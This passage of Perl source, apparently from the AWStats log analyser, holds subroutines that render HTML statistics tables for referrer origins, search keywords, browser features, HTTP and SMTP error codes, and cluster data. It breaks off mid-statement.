$_ != 4 || $IncludeInternalLinksInOriginSection )\n\t\t  ? $_from_p[$_]\n\t\t  : 0;\n\t}\n\tmy $Totalh = 0;\n\tforeach ( 0 .. 5 ) {\n\t\t$Totalh +=\n\t\t  ( $_ != 4 || $IncludeInternalLinksInOriginSection )\n\t\t  ? $_from_h[$_]\n\t\t  : 0;\n\t}\n\n    my $title = \"$Message[36]\";\n\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link\n           $title .= \" &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=ORIGIN&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    }\n        \n\t&tab_head( $title, 19, 0, 'referer' );\n\tmy @p_p = ( 0, 0, 0, 0, 0, 0 );\n\tif ( $Totalp > 0 ) {\n\t\t$p_p[0] = int( $_from_p[0] / $Totalp * 1000 ) / 10;\n\t\t$p_p[1] = int( $_from_p[1] / $Totalp * 1000 ) / 10;\n\t\t$p_p[2] = int( $_from_p[2] / $Totalp * 1000 ) / 10;\n\t\t$p_p[3] = int( $_from_p[3] / $Totalp * 1000 ) / 10;\n\t\t$p_p[4] = int( $_from_p[4] / $Totalp * 1000 ) / 10;\n\t\t$p_p[5] = int( $_from_p[5] / $Totalp * 1000 ) / 10;\n\t}\n\tmy @p_h = ( 0, 0, 0, 0, 0, 0 );\n\tif ( $Totalh > 0 ) {\n\t\t$p_h[0] = int( $_from_h[0] / $Totalh * 1000 ) / 10;\n\t\t$p_h[1] = int( $_from_h[1] / $Totalh * 1000 ) / 10;\n\t\t$p_h[2] = int( $_from_h[2] / $Totalh * 1000 ) / 10;\n\t\t$p_h[3] = int( $_from_h[3] / $Totalh * 1000 ) / 10;\n\t\t$p_h[4] = int( $_from_h[4] / $Totalh * 1000 ) / 10;\n\t\t$p_h[5] = int( $_from_h[5] / $Totalh * 1000 ) / 10;\n\t}\n\tprint\n\t  \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>$Message[37]</th>\";\n\tif ( $ShowOriginStats =~ /P/i ) {\n\t\tprint\n\"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[56]</th><th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[15]</th>\";\n\t}\n\tif ( $ShowOriginStats =~ /H/i ) {\n\t\tprint\n\"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th><th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[15]</th>\";\n\t}\n\tprint \"</tr>\\n\";\n\n\t#------- Referrals by direct address/bookmark/link in email/etc...\n\tprint \"<tr><td class=\\\"aws\\\"><b>$Message[38]</b></td>\";\n\tif ( $ShowOriginStats =~ /P/i ) {\n\t\tprint \"<td>\"\n\t\t  . ( $_from_p[0] ? Format_Number($_from_p[0]) : \"&nbsp;\" )\n\t\t  . \"</td><td>\"\n\t\t  . ( $_from_p[0] ? \"$p_p[0] %\" : \"&nbsp;\" ) . \"</td>\";\n\t}\n\tif ( $ShowOriginStats =~ /H/i ) {\n\t\tprint \"<td>\"\n\t\t  . ( $_from_h[0] ? Format_Number($_from_h[0]) : \"&nbsp;\" )\n\t\t  . \"</td><td>\"\n\t\t  . ( $_from_h[0] ? \"$p_h[0] %\" : \"&nbsp;\" ) . \"</td>\";\n\t}\n\tprint \"</tr>\\n\";\n\n\t#------- Referrals by search engines\n\tprint \"<tr\"\n\t  . Tooltip(13)\n\t  . \"><td class=\\\"aws\\\"><b>$Message[40]</b> - <a href=\\\"\"\n\t  . (\n\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t  || !$StaticLinks\n\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=refererse\")\n\t\t: \"$StaticLinks.refererse.$StaticExt\"\n\t  )\n\t  . \"\\\"$NewLinkTarget>$Message[80]</a><br />\\n\";\n\tif ( scalar keys %_se_referrals_h ) {\n\t\tprint \"<table>\\n\";\n\t\tmy $total_p = 0;\n\t\tmy $total_h = 0;\n\t\tmy $count = 0;\n\t\t&BuildKeyList(\n\t\t\t$MaxNbOf{'RefererShown'},\n\t\t\t$MinHit{'Refer'},\n\t\t\t\\%_se_referrals_h,\n\t\t\t(\n\t\t\t\t( scalar keys %_se_referrals_p )\n\t\t\t\t? \\%_se_referrals_p\n\t\t\t\t: \\%_se_referrals_h\n\t\t\t)\n\t\t);\n\t\tforeach my $key (@keylist) {\n\t\t\tmy $newreferer = $SearchEnginesHashLib{$key}\n\t\t\t  || CleanXSS($key);\n\t\t\tprint \"<tr><td class=\\\"aws\\\">- $newreferer</td>\";\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\tFormat_Number($_se_referrals_p{$key} ? $_se_referrals_p{$key} : '0' ))\n\t\t\t  . \"</td>\";\n\t\t\tprint \"<td> / \".Format_Number($_se_referrals_h{$key}).\"</td>\";\n\t\t\tprint \"</tr>\\n\";\n\t\t\t$total_p += $_se_referrals_p{$key};\n\t\t\t$total_h += $_se_referrals_h{$key};\n\t\t\t$count++;\n\t\t}\n\t\tif ($Debug) {\n\t\t\tdebug(\n\"Total real / shown : $TotalSearchEnginesPages / $total_p -  $TotalSearchEnginesHits / $total_h\",\n\t\t\t\t2\n\t\t\t);\n\t\t}\n\t\tmy $rest_p = $TotalSearchEnginesPages - $total_p;\n\t\tmy $rest_h = $TotalSearchEnginesHits - $total_h;\n\t\tif ( $rest_p > 0 || $rest_h > 0 ) {\n\t\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">- $Message[2]</span></td>\";\n\t\t\tprint \"<td>\".Format_Number($rest_p).\"</td>\";\n\t\t\tprint \"<td> / \".Format_Number($rest_h).\"</td>\";\n\t\t\tprint \"</tr>\\n\";\n\t\t}\n\t\tprint \"</table>\";\n\t}\n\tprint \"</td>\\n\";\n\tif ( $ShowOriginStats =~ /P/i ) {\n\t\tprint \"<td valign=\\\"top\\\">\"\n\t\t  . ( $_from_p[2] ? Format_Number($_from_p[2]) : \"&nbsp;\" )\n\t\t  . \"</td><td valign=\\\"top\\\">\"\n\t\t  . ( $_from_p[2] ? \"$p_p[2] %\" : \"&nbsp;\" ) . \"</td>\";\n\t}\n\tif ( $ShowOriginStats =~ /H/i ) {\n\t\tprint \"<td valign=\\\"top\\\">\"\n\t\t  . ( $_from_h[2] ? Format_Number($_from_h[2]) : \"&nbsp;\" )\n\t\t  . \"</td><td valign=\\\"top\\\">\"\n\t\t  . ( $_from_h[2] ? \"$p_h[2] %\" : \"&nbsp;\" ) . \"</td>\";\n\t}\n\tprint \"</tr>\\n\";\n\n\t#------- Referrals by external HTML link\n\tprint \"<tr\"\n\t  . Tooltip(14)\n\t  . \"><td class=\\\"aws\\\"><b>$Message[41]</b> - <a href=\\\"\"\n\t  . (\n\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t  || !$StaticLinks\n\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=refererpages\")\n\t\t: \"$StaticLinks.refererpages.$StaticExt\"\n\t  )\n\t  . \"\\\"$NewLinkTarget>$Message[80]</a><br />\\n\";\n\tif ( scalar keys %_pagesrefs_h ) {\n\t\tprint \"<table>\\n\";\n\t\tmy $total_p = 0;\n\t\tmy $total_h = 0;\n\t\tmy $count = 0;\n\t\t&BuildKeyList(\n\t\t\t$MaxNbOf{'RefererShown'},\n\t\t\t$MinHit{'Refer'},\n\t\t\t\\%_pagesrefs_h,\n\t\t\t(\n\t\t\t\t( scalar keys %_pagesrefs_p )\n\t\t\t\t? \\%_pagesrefs_p\n\t\t\t\t: \\%_pagesrefs_h\n\t\t\t)\n\t\t);\n\t\tforeach my $key (@keylist) {\n\t\t\tprint \"<tr><td class=\\\"aws\\\">- \";\n\t\t\t&HTMLShowURLInfo($key);\n\t\t\tprint \"</td>\";\n\t\t\tprint \"<td>\"\n\t\t\t  . Format_Number(( $_pagesrefs_p{$key} ? $_pagesrefs_p{$key} : '0' ))\n\t\t\t  . \"</td>\";\n\t\t\tprint \"<td>\".Format_Number($_pagesrefs_h{$key}).\"</td>\";\n\t\t\tprint \"</tr>\\n\";\n\t\t\t$total_p += $_pagesrefs_p{$key};\n\t\t\t$total_h += $_pagesrefs_h{$key};\n\t\t\t$count++;\n\t\t}\n\t\tif ($Debug) {\n\t\t\tdebug(\n\"Total real / shown : $TotalRefererPages / $total_p - $TotalRefererHits / $total_h\",\n\t\t\t\t2\n\t\t\t);\n\t\t}\n\t\tmy $rest_p = $TotalRefererPages - $total_p;\n\t\tmy $rest_h = $TotalRefererHits - $total_h;\n\t\tif ( $rest_p > 0 || $rest_h > 0 ) {\n\t\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">- $Message[2]</span></td>\";\n\t\t\tprint \"<td>\".Format_Number($rest_p).\"</td>\";\n\t\t\tprint \"<td>\".Format_Number($rest_h).\"</td>\";\n\t\t\tprint \"</tr>\\n\";\n\t\t}\n\t\tprint \"</table>\";\n\t}\n\tprint \"</td>\\n\";\n\tif ( $ShowOriginStats =~ /P/i ) {\n\t\tprint \"<td valign=\\\"top\\\">\"\n\t\t  . ( $_from_p[3] ? Format_Number($_from_p[3]) : \"&nbsp;\" )\n\t\t  . \"</td><td valign=\\\"top\\\">\"\n\t\t  . ( $_from_p[3] ? \"$p_p[3] %\" : \"&nbsp;\" ) . \"</td>\";\n\t}\n\tif ( $ShowOriginStats =~ /H/i ) {\n\t\tprint \"<td valign=\\\"top\\\">\"\n\t\t  . ( $_from_h[3] ? Format_Number($_from_h[3]) : \"&nbsp;\" )\n\t\t  . \"</td><td valign=\\\"top\\\">\"\n\t\t  . ( $_from_h[3] ? \"$p_h[3] %\" : \"&nbsp;\" ) . \"</td>\";\n\t}\n\tprint \"</tr>\\n\";\n\n\t#------- Referrals by internal HTML link\n\tif ($IncludeInternalLinksInOriginSection) {\n\t\tprint \"<tr><td class=\\\"aws\\\"><b>$Message[42]</b></td>\";\n\t\tif ( $ShowOriginStats =~ /P/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ( $_from_p[4] ? Format_Number($_from_p[4]) : \"&nbsp;\" )\n\t\t\t  . \"</td><td>\"\n\t\t\t  . ( $_from_p[4] ? \"$p_p[4] %\" : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowOriginStats =~ /H/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ( $_from_h[4] ? Format_Number($_from_h[4]) : \"&nbsp;\" )\n\t\t\t  . \"</td><td>\"\n\t\t\t  . ( $_from_h[4] ? \"$p_h[4] %\" : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t}\n\n\t#------- Referrals by news group\n\t#print \"<tr><td class=\\\"aws\\\"><b>$Message[107]</b></td>\";\n\t#if ($ShowOriginStats =~ /P/i) { print \"<td>\".($_from_p[5]?$_from_p[5]:\"&nbsp;\").\"</td><td>\".($_from_p[5]?\"$p_p[5] %\":\"&nbsp;\").\"</td>\"; }\n\t#if ($ShowOriginStats =~ /H/i) { print \"<td>\".($_from_h[5]?$_from_h[5]:\"&nbsp;\").\"</td><td>\".($_from_h[5]?\"$p_h[5] %\":\"&nbsp;\").\"</td>\"; }\n\t#print \"</tr>\\n\";\n\t\n\t#------- Unknown origin\n\tprint \"<tr><td class=\\\"aws\\\"><b>$Message[39]</b></td>\";\n\tif ( $ShowOriginStats =~ /P/i ) {\n\t\tprint \"<td>\"\n\t\t  . ( $_from_p[1] ? Format_Number($_from_p[1]) : \"&nbsp;\" )\n\t\t  . \"</td><td>\"\n\t\t  . ( $_from_p[1] ? \"$p_p[1] %\" : \"&nbsp;\" ) . \"</td>\";\n\t}\n\tif ( $ShowOriginStats =~ /H/i ) {\n\t\tprint \"<td>\"\n\t\t  . ( $_from_h[1] ? Format_Number($_from_h[1]) : \"&nbsp;\" )\n\t\t  . \"</td><td>\"\n\t\t  . ( $_from_h[1] ? \"$p_h[1] %\" : \"&nbsp;\" ) . \"</td>\";\n\t}\n\tprint \"</tr>\\n\";\n\t&tab_end();\n\n\t# 0: Direct\n\t# 1: Unknown\n\t# 2: SE\n\t# 3: External link\n\t# 4: Internal link\n\t# 5: Newsgroup (deprecated)\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Key Phrases and Keywords chart and table\n# Parameters:   $NewLinkParams, $NewLinkTarget\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainKeys{\n\tmy $NewLinkParams = shift;\n\tmy $NewLinkTarget = shift;\n\t\n\tif ($ShowKeyphrasesStats) {\n\t\tprint \"$Center<a name=\\\"keyphrases\\\">&nbsp;</a>\";\n\t}\n\tif ($ShowKeywordsStats) {\n\t\tprint \"$Center<a name=\\\"keywords\\\">&nbsp;</a>\";\n\t}\n\tif ( $ShowKeyphrasesStats || $ShowKeywordsStats ) { print \"<br />\\n\"; }\n\tif ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {\n\t\tprint\n\t\t  \"<table width=\\\"100%\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\"><tr>\";\n\t}\n\tif ($ShowKeyphrasesStats) {\n\t\t\n\t\t# By Keyphrases\n\t\tif ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {\n\t\t\tprint \"<td width=\\\"50%\\\" valign=\\\"top\\\">\\n\";\n\t\t}\n\t\tif ($Debug) { debug( \"ShowKeyphrasesStats\", 2 ); }\n\t\t&tab_head(\n\"$Message[120] ($Message[77] $MaxNbOf{'KeyphrasesShown'})<br /><a href=\\\"\"\n\t\t\t  . (\n\t\t\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t\t\t  || !$StaticLinks\n\t\t\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=keyphrases\")\n\t\t\t\t: \"$StaticLinks.keyphrases.$StaticExt\"\n\t\t\t  )\n\t\t\t  . \"\\\"$NewLinkTarget>$Message[80]</a>\",\n\t\t\t19,\n\t\t\t( $ShowKeyphrasesStats && $ShowKeywordsStats ) ? 95 : 70,\n\t\t\t'keyphrases'\n\t\t);\n\t\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"\"\n\t\t  . Tooltip(15)\n\t\t  . \"><th>$TotalDifferentKeyphrases $Message[103]</th><th bgcolor=\\\"#$color_s\\\" width=\\\"80\\\">$Message[14]</th><th bgcolor=\\\"#$color_s\\\" width=\\\"80\\\">$Message[15]</th></tr>\\n\";\n\t\tmy $total_s = 0;\n\t\tmy $count = 0;\n\t\t&BuildKeyList( $MaxNbOf{'KeyphrasesShown'},\n\t\t\t$MinHit{'Keyphrase'}, \\%_keyphrases, \\%_keyphrases );\n\t\tforeach my $key (@keylist) {\n\t\t\tmy $mot;\n\n  # Convert coded keywords (utf8,...) to be correctly reported in HTML page.\n\t\t\tif ( $PluginsLoaded{'DecodeKey'}{'decodeutfkeys'} ) {\n\t\t\t\t$mot = CleanXSS(\n\t\t\t\t\tDecodeKey_decodeutfkeys(\n\t\t\t\t\t\t$key, $PageCode || 'iso-8859-1'\n\t\t\t\t\t)\n\t\t\t\t);\n\t\t\t}\n\t\t\telse { $mot = CleanXSS( DecodeEncodedString($key) ); }\n\t\t\tmy $p;\n\t\t\tif ($TotalKeyphrases) {\n\t\t\t\t$p =\n\t\t\t\t  int( $_keyphrases{$key} / $TotalKeyphrases * 1000 ) / 10;\n\t\t\t}\n\t\t\tprint \"<tr><td class=\\\"aws\\\">\"\n\t\t\t  . XMLEncode($mot)\n\t\t\t  . \"</td><td>$_keyphrases{$key}</td><td>$p %</td></tr>\\n\";\n\t\t\t$total_s += $_keyphrases{$key};\n\t\t\t$count++;\n\t\t}\n\t\tif ($Debug) {\n\t\t\tdebug( \"Total real / shown : $TotalKeyphrases / $total_s\", 2 );\n\t\t}\n\t\tmy $rest_s = $TotalKeyphrases - $total_s;\n\t\tif ( $rest_s > 0 ) {\n\t\t\tmy $p;\n\t\t\tif ($TotalKeyphrases) {\n\t\t\t\t$p = int( $rest_s / $TotalKeyphrases * 1000 ) / 10;\n\t\t\t}\n\t\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[124]</span></td><td>$rest_s</td>\";\n\t\t\tprint \"<td>$p&nbsp;%</td></tr>\\n\";\n\t\t}\n\t\t&tab_end();\n\t\tif ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {\n\t\t\tprint \"</td>\\n\";\n\t\t}\n\t}\n\tif ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {\n\t\tprint \"<td> &nbsp; </td>\";\n\t}\n\tif ($ShowKeywordsStats) {\n\n\t\t# By Keywords\n\t\tif ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {\n\t\t\tprint \"<td width=\\\"50%\\\" valign=\\\"top\\\">\\n\";\n\t\t}\n\t\tif ($Debug) { debug( \"ShowKeywordsStats\", 2 ); }\n\t\t&tab_head(\n\"$Message[121] ($Message[77] $MaxNbOf{'KeywordsShown'})<br /><a href=\\\"\"\n\t\t\t  . (\n\t\t\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t\t\t  || !$StaticLinks\n\t\t\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=keywords\")\n\t\t\t\t: \"$StaticLinks.keywords.$StaticExt\"\n\t\t\t  )\n\t\t\t  . \"\\\"$NewLinkTarget>$Message[80]</a>\",\n\t\t\t19,\n\t\t\t( $ShowKeyphrasesStats && $ShowKeywordsStats ) ? 95 : 70,\n\t\t\t'keywords'\n\t\t);\n\t\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"\"\n\t\t  . Tooltip(15)\n\t\t  . \"><th>$TotalDifferentKeywords $Message[13]</th><th bgcolor=\\\"#$color_s\\\" width=\\\"80\\\">$Message[14]</th><th bgcolor=\\\"#$color_s\\\" width=\\\"80\\\">$Message[15]</th></tr>\\n\";\n\t\tmy $total_s = 0;\n\t\tmy $count = 0;\n\t\t&BuildKeyList( $MaxNbOf{'KeywordsShown'},\n\t\t\t$MinHit{'Keyword'}, \\%_keywords, \\%_keywords );\n\t\tforeach my $key (@keylist) {\n\t\t\tmy $mot;\n\n  # Convert coded keywords (utf8,...) to be correctly reported in HTML page.\n\t\t\tif ( $PluginsLoaded{'DecodeKey'}{'decodeutfkeys'} ) {\n\t\t\t\t$mot = CleanXSS(\n\t\t\t\t\tDecodeKey_decodeutfkeys(\n\t\t\t\t\t\t$key, $PageCode || 'iso-8859-1'\n\t\t\t\t\t)\n\t\t\t\t);\n\t\t\t}\n\t\t\telse { $mot = CleanXSS( DecodeEncodedString($key) ); }\n\t\t\tmy $p;\n\t\t\tif ($TotalKeywords) {\n\t\t\t\t$p = int( $_keywords{$key} / $TotalKeywords * 1000 ) / 10;\n\t\t\t}\n\t\t\tprint \"<tr><td class=\\\"aws\\\">\"\n\t\t\t  . XMLEncode($mot)\n\t\t\t  . \"</td><td>$_keywords{$key}</td><td>$p %</td></tr>\\n\";\n\t\t\t$total_s += $_keywords{$key};\n\t\t\t$count++;\n\t\t}\n\t\tif ($Debug) {\n\t\t\tdebug( \"Total real / shown : $TotalKeywords / $total_s\", 2 );\n\t\t}\n\t\tmy $rest_s = $TotalKeywords - $total_s;\n\t\tif ( $rest_s > 0 ) {\n\t\t\tmy $p;\n\t\t\tif ($TotalKeywords) {\n\t\t\t\t$p = int( $rest_s / $TotalKeywords * 1000 ) / 10;\n\t\t\t}\n\t\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[30]</span></td><td>$rest_s</td>\";\n\t\t\tprint \"<td>$p %</td></tr>\\n\";\n\t\t}\n\t\t&tab_end();\n\t\tif ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {\n\t\t\tprint \"</td>\\n\";\n\t\t}\n\t}\n\tif ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {\n\t\tprint \"</tr></table>\\n\";\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the miscellaneous table\n# Parameters:   -\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainMisc{\n\tif ($Debug) { debug( \"ShowMiscStats\", 2 ); }\n\tprint \"$Center<a name=\\\"misc\\\">&nbsp;</a><br />\\n\";\n\tmy $title = \"$Message[139]\";\n\t&tab_head( \"$title\", 19, 0, 'misc' );\n\tprint\n\t  \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>$Message[139]</th>\";\n\tprint \"<th width=\\\"100\\\">&nbsp;</th>\";\n\tprint \"<th width=\\\"100\\\">&nbsp;</th>\";\n\tprint \"</tr>\\n\";\n\tmy %label = (\n\t\t'AddToFavourites'           => $Message[137],\n\t\t'JavascriptDisabled'        => $Message[168],\n\t\t'JavaEnabled'               => $Message[140],\n\t\t'DirectorSupport'           => $Message[141],\n\t\t'FlashSupport'              => $Message[142],\n\t\t'RealPlayerSupport'         => $Message[143],\n\t\t'QuickTimeSupport'          => $Message[144],\n\t\t'WindowsMediaPlayerSupport' => $Message[145],\n\t\t'PDFSupport'                => $Message[146]\n\t);\n\n\tforeach my $key (@MiscListOrder) {\n\t\tmy $mischar = substr( $key, 0, 1 );\n\t\tif ( $ShowMiscStats !~ /$mischar/i ) { next; }\n\t\tmy $total = 0;\n\t\tmy $p;\n\t\tif ( $MiscListCalc{$key} eq 'v' ) { $total = $TotalVisits; }\n\t\tif ( $MiscListCalc{$key} eq 'u' ) { $total = $TotalUnique; }\n\t\tif ( $MiscListCalc{$key} eq 'hm' ) {\n\t\t\t$total = $_misc_h{'TotalMisc'} || 0;\n\t\t}\n\t\tif ($total) {\n\t\t\t$p =\n\t\t\t  int( ( $_misc_h{$key} ? $_misc_h{$key} : 0 ) / $total *\n\t\t\t\t  1000 ) / 10;\n\t\t}\n\t\tprint \"<tr>\";\n\t\tprint \"<td class=\\\"aws\\\">\"\n\t\t  . ( $PageDir eq 'rtl' ? \"<span dir=\\\"ltr\\\">\" : \"\" )\n\t\t  . $label{$key}\n\t\t  . ( $PageDir eq 'rtl' ? \"</span>\" : \"\" ) . \"</td>\";\n\t\tif ( $MiscListCalc{$key} eq 'v' ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . Format_Number(( $_misc_h{$key} || 0 ))\n\t\t\t  . \" / \".Format_Number($total).\" $Message[12]</td>\";\n\t\t}\n\t\tif ( $MiscListCalc{$key} eq 'u' ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . Format_Number(( $_misc_h{$key} || 0 ))\n\t\t\t  . \" / \".Format_Number($total).\" $Message[18]</td>\";\n\t\t}\n\t\tif ( $MiscListCalc{$key} eq 'hm' ) { print \"<td>-</td>\"; }\n\t\tprint \"<td>\" . ( $total ? \"$p %\" : \"&nbsp;\" ) . \"</td>\";\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Status codes chart and table\n# Parameters:   $NewLinkParams, $NewLinkTarget\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainHTTPStatus{\n\tmy $NewLinkParams = shift;\n\tmy $NewLinkTarget = shift;\n\t\n\tif ($Debug) { debug( \"ShowHTTPErrorsStats\", 2 ); }\n\tprint \"$Center<a name=\\\"errors\\\">&nbsp;</a><br />\\n\";\n\tmy $title = \"$Message[32]\";\n\t\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link\n           $title .= \" &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=ERRORS&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    }\n        \t\n\t&tab_head( \"$title\", 19, 0, 'errors' );\n\t\n\t&BuildKeyList( $MaxRowsInHTMLOutput, 1, \\%_errors_h, \\%_errors_h );\n\t\t\n\t# Graph the top five in a pie chart\n\tif (scalar @keylist > 1){\n\t\tforeach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )\n\t\t{\n\t\t\tmy @blocklabel = ();\n\t\t\tmy @valdata = ();\n\t\t\tmy @valcolor = ($color_p);\n\t\t\tmy $cnt = 0;\n\t\t\tforeach my $key (@keylist) {\n\t\t\t\tpush @valdata, int( $_errors_h{$key} / $TotalHitsErrors * 1000 ) / 10;\n\t\t\t\tpush @blocklabel, \"$key\";\n\t\t\t\t$cnt++;\n\t\t\t\tif ($cnt > 4) { last; }\n\t\t\t}\n\t\t\tprint \"<tr><td colspan=\\\"5\\\">\";\n\t\t\tmy $function = \"ShowGraph_$pluginname\";\n\t\t\t&$function(\n\t\t\t\t\"$title\",              \"httpstatus\",\n\t\t\t\t0, \t\t\t\t\t\t\\@blocklabel,\n\t\t\t\t0,           \t\t\t\\@valcolor,\n\t\t\t\t0,              \t\t0,\n\t\t\t\t0,          \t\t\t\\@valdata\n\t\t\t);\n\t\t\tprint \"</td></tr>\";\n\t\t}\n\t}\n\t\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th colspan=\\\"2\\\">$Message[32]*</th><th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th><th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[15]</th><th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[75]</th></tr>\\n\";\n\tmy $total_h = 0;\n\tmy $count = 0;\n\tforeach my $key (@keylist) {\n\t\tmy $p = int( $_errors_h{$key} / $TotalHitsErrors * 1000 ) / 10;\n\t\tprint \"<tr\" . Tooltip( $key, $key ) . \">\";\n\t\tif ( $TrapInfosForHTTPErrorCodes{$key} ) {\n\t\t\tprint \"<td><a href=\\\"\"\n\t\t\t  . (\n\t\t\t\t$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks\n\t\t\t\t? XMLEncode(\n\t\t\t\t\t\"$AWScript${NewLinkParams}output=errors$key\")\n\t\t\t\t: \"$StaticLinks.errors$key.$StaticExt\"\n\t\t\t  )\n\t\t\t  . \"\\\"$NewLinkTarget>$key</a></td>\";\n\t\t}\n\t\telse { print \"<td valign=\\\"top\\\">$key</td>\"; }\n\t\tprint \"<td class=\\\"aws\\\">\"\n\t\t  . (\n\t\t\t$httpcodelib{$key} ? $httpcodelib{$key} : 'Unknown error' )\n\t\t  . \"</td><td>\".Format_Number($_errors_h{$key}).\"</td><td>$p %</td><td>\"\n\t\t  . Format_Bytes( $_errors_k{$key} ) . \"</td>\";\n\t\tprint \"</tr>\\n\";\n\t\t$total_h += $_errors_h{$key};\n\t\t$count++;\n\t}\n\t&tab_end(\"* $Message[154]\");\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Status codes chart and table\n# Parameters:   $NewLinkParams, $NewLinkTarget\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainSMTPStatus{\n\tmy $NewLinkParams = shift;\n\tmy $NewLinkTarget = shift;\n\t\n\tif ($Debug) { debug( \"ShowSMTPErrorsStats\", 2 ); }\n\tprint \"$Center<a name=\\\"errors\\\">&nbsp;</a><br />\\n\";\n\tmy $title = \"$Message[147]\";\n\t&tab_head( \"$title\", 19, 0, 'errors' );\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th colspan=\\\"2\\\">$Message[147]</th><th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th><th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[15]</th><th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[75]</th></tr>\\n\";\n\tmy $total_h = 0;\n\tmy $count = 0;\n\t&BuildKeyList( $MaxRowsInHTMLOutput, 1, \\%_errors_h, \\%_errors_h );\n\n\tforeach my $key (@keylist) {\n\t\tmy $p = int( $_errors_h{$key} / $TotalHitsErrors * 1000 ) / 10;\n\t\tprint \"<tr\" . Tooltip( $key, $key ) . \">\";\n\t\tprint \"<td valign=\\\"top\\\">$key</td>\";\n\t\tprint \"<td class=\\\"aws\\\">\"\n\t\t  . (\n\t\t\t$smtpcodelib{$key} ? $smtpcodelib{$key} : 'Unknown error' )\n\t\t  . \"</td><td>\".Format_Number($_errors_h{$key}).\"</td><td>$p %</td><td>\"\n\t\t  . Format_Bytes( $_errors_k{$key} ) . \"</td>\";\n\t\tprint \"</tr>\\n\";\n\t\t$total_h += $_errors_h{$key};\n\t\t$count++;\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the cluster information chart and table\n# Parameters:   $NewLinkParams, $NewLinkTarget\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainCluster{\n\tmy $NewLinkParams = shift;\n\tmy $NewLinkTarget = shift;\n\t\n\tif ($Debug) { debug( \"ShowClusterStats\", 2 ); }\n\tprint \"$Center<a name=\\\"clusters\\\">&nbsp;</a><br />\\n\";\n\tmy $title = \"$Message[155]\";\n\t\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link\n           $title .= \" &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               